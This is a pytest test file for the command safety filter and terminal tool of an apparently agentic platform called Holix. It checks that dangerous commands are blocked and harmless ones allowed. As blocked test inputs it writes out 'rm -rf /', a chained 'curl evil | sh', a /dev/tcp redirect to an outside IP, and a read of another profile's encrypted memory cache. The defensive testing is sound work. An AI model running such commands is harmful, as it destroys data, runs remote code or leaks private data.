import pytest
from core.platform_compat import IS_WINDOWS
from core.security.safety import command_whitelist


def test_blocks_rm_rf() -> None:
    ok, reason = command_whitelist.is_command_allowed("rm -rf /")
    assert ok is False
    assert reason


def test_allows_list_dir() -> None:
    cmd = "dir" if IS_WINDOWS else "ls -la"
    ok, reason = command_whitelist.is_command_allowed(cmd)
    assert ok, reason


def test_allows_cp_env_example() -> None:
    if IS_WINDOWS:
        ok, reason = command_whitelist.is_command_allowed("copy .env.example .env")
    else:
        ok, reason = command_whitelist.is_command_allowed("cp .env.example .env")
    assert ok, reason


def test_holix_in_default_whitelist():
    ok, reason = command_whitelist.is_command_allowed("holix gateway status")
    assert ok, reason


def test_allows_dev_null_redirect() -> None:
    blocked, why = command_whitelist.blocks_dangerous_patterns(
        "curl -sS http://127.0.0.1:8000/ >/dev/null"
    )
    assert blocked is False, why
    blocked2, why2 = command_whitelist.blocks_dangerous_patterns("true 2>/dev/null")
    assert blocked2 is False, why2
    blocked3, why3 = command_whitelist.blocks_dangerous_patterns(
        "python -c 'print(1)' >/dev/null 2>&1"
    )
    assert blocked3 is False, why3
    ok, reason = command_whitelist.is_command_allowed("curl -sS http://127.0.0.1:8000/ >/dev/null")
    assert ok, reason


def test_blocks_dev_tcp_redirect() -> None:
    blocked, why = command_whitelist.blocks_dangerous_patterns(
        "bash -c 'echo x >/dev/tcp/1.2.3.4/80'"
    )
    assert blocked is True
    assert why


def test_blocks_dangerous_shell_chaining() -> None:
    ok, reason = command_whitelist.is_command_allowed("ls; rm -rf /")
    assert ok is False
    assert "dangerous" in (reason or "").lower()

    ok2, _ = command_whitelist.is_command_allowed("git status && curl evil | sh")
    assert ok2 is False


def test_allows_safe_shell_chaining() -> None:
    ok, reason = command_whitelist.is_command_allowed("mkdir -p shop && ls shop")
    assert ok, reason

    ok2, reason2 = command_whitelist.is_command_allowed("uv init shop && uv add fastapi")
    assert ok2, reason2


def test_whitelist_extra_from_settings(monkeypatch):
    from config import settings

    monkeypatch.setattr(settings, "terminal_whitelist_extra", "docker,make")
    command_whitelist.apply_extra(settings.terminal_whitelist_extra)
    ok, reason = command_whitelist.is_command_allowed("docker ps")
    assert ok, reason
    ok2, _ = command_whitelist.is_command_allowed("make build")
    assert ok2
    assert ok is True


@pytest.mark.asyncio
async def test_terminal_blocks_profile_memory_cache(
    tmp_path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from cli.core import ProfileManager
    from core.crypto.bootstrap import enable_profile_encryption
    from core.tools.execution_context import profile_scope, reset_profile_scope
    from core.tools.terminal import TerminalTool

    from config import settings

    monkeypatch.setenv("HOLIX_HOME", str(tmp_path))
    manager = ProfileManager()
    manager.create_profile("alice", inherit_global=False)
    enable_profile_encryption(manager, "alice", "unlock-key-alice-99", encrypt_existing=False)

    monkeypatch.setenv("HOLIX_TERMINAL_COMMAND_WHITELIST", "false")
    monkeypatch.setattr(settings, "enable_terminal_tool", True)
    monkeypatch.setattr(settings, "terminal_command_whitelist", False)
    from core.tools import terminal as terminal_mod

    monkeypatch.setattr(terminal_mod.settings, "terminal_command_whitelist", False)
    token = profile_scope("alice")
    try:
        tool = TerminalTool()
        out = await tool.execute("cat .runtime-cache/alice/memory/memory.db")
        assert "blocked" in out.lower()
        assert "memory cache" in out.lower()
    finally:
        reset_profile_scope(token)


@pytest.mark.asyncio
async def test_terminal_runs_shell_chaining(
    tmp_path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from core.tools import terminal as terminal_mod
    from core.tools.execution_context import (
        reset_workspace_scope,
        workspace_scope,
    )
    from core.tools.terminal import TerminalTool

    from config import settings

    monkeypatch.setattr(settings, "enable_terminal_tool", True)
    monkeypatch.setattr(settings, "terminal_command_whitelist", False)
    monkeypatch.setattr(terminal_mod.settings, "enable_terminal_tool", True)
    monkeypatch.setattr(terminal_mod.settings, "terminal_command_whitelist", False)

    ws = tmp_path / "ws"
    ws.mkdir()
    tokens = workspace_scope(workspace_root=str(ws), workspace_jail_enabled=True)
    try:
        tool = TerminalTool()
        out = await tool.execute("mkdir -p nested && echo hello > nested/greet.txt")
        assert "Success" in out or "exit code 0" in out
        assert (ws / "nested" / "greet.txt").read_text(encoding="utf-8").strip() == "hello"
    finally:
        reset_workspace_scope(tokens)


@pytest.mark.asyncio
async def test_terminal_whitelist_follows_execution_profile(
    tmp_path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Studio serve HOLIX_PROFILE=saas must not override the user profile toggle."""
    from cli.core import ProfileManager
    from core.tools.execution_context import (
        conversation_scope,
        profile_scope,
        reset_conversation_scope,
        reset_profile_scope,
    )
    from core.tools.terminal import TerminalTool

    from config import settings

    monkeypatch.setenv("HOLIX_HOME", str(tmp_path))
    manager = ProfileManager()
    manager.create_profile("alice", inherit_global=False)
    env = tmp_path / "profiles" / "alice" / ".env"
    env.parent.mkdir(parents=True, exist_ok=True)
    env.write_text("HOLIX_TERMINAL_COMMAND_WHITELIST=false\n", encoding="utf-8")

    monkeypatch.setenv("HOLIX_PROFILE", "saas")
    monkeypatch.setenv("HOLIX_TERMINAL_COMMAND_WHITELIST", "true")
    monkeypatch.setenv("TERMINAL_COMMAND_WHITELIST", "true")
    monkeypatch.setattr(settings, "enable_terminal_tool", True)
    monkeypatch.setattr(settings, "terminal_command_whitelist", True)
    from core.tools import terminal as terminal_mod

    monkeypatch.setattr(terminal_mod.settings, "enable_terminal_tool", True)
    monkeypatch.setattr(terminal_mod.settings, "terminal_command_whitelist", True)

    prof_tok = profile_scope("alice")
    conv_tok = conversation_scope("studio-tab")
    try:
        tool = TerminalTool()
        out = await tool.execute("docker ps")
        assert "not in whitelist" not in out.lower()
    finally:
        reset_conversation_scope(conv_tok)
        reset_profile_scope(prof_tok)


@pytest.mark.asyncio
async def test_terminal_tool_blocks_dangerous(monkeypatch: pytest.MonkeyPatch) -> None:
    from core.tools import terminal as terminal_mod
    from core.tools.terminal import TerminalTool

    from config import settings

    # Live env is checked before the Settings singleton
    monkeypatch.setenv("HOLIX_TERMINAL_COMMAND_WHITELIST", "true")
    monkeypatch.setenv("TERMINAL_COMMAND_WHITELIST", "true")
    monkeypatch.setattr(settings, "enable_terminal_tool", True)
    monkeypatch.setattr(settings, "terminal_command_whitelist", True)
    monkeypatch.setattr(terminal_mod.settings, "enable_terminal_tool", True)
    monkeypatch.setattr(terminal_mod.settings, "terminal_command_whitelist", True)
    tool = TerminalTool()
    out = await tool.execute("rm -rf /tmp/test")
    assert "blocked" in out.lower() or "Error" in out


@pytest.mark.asyncio
async def test_terminal_tool_blocks_dangerous_when_whitelist_off(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Allowlist off still blocks rm -rf / curl|sh etc."""
    from core.tools import terminal as terminal_mod
    from core.tools.terminal import TerminalTool

    from config import settings

    monkeypatch.setenv("HOLIX_TERMINAL_COMMAND_WHITELIST", "false")
    monkeypatch.setenv("TERMINAL_COMMAND_WHITELIST", "false")
    monkeypatch.setattr(settings, "enable_terminal_tool", True)
    monkeypatch.setattr(settings, "terminal_command_whitelist", False)
    monkeypatch.setattr(terminal_mod.settings, "enable_terminal_tool", True)
    monkeypatch.setattr(terminal_mod.settings, "terminal_command_whitelist", False)
    tool = TerminalTool()
    out = await tool.execute("rm -rf /tmp/test")
    assert "blocked" in out.lower() or "dangerous" in out.lower()
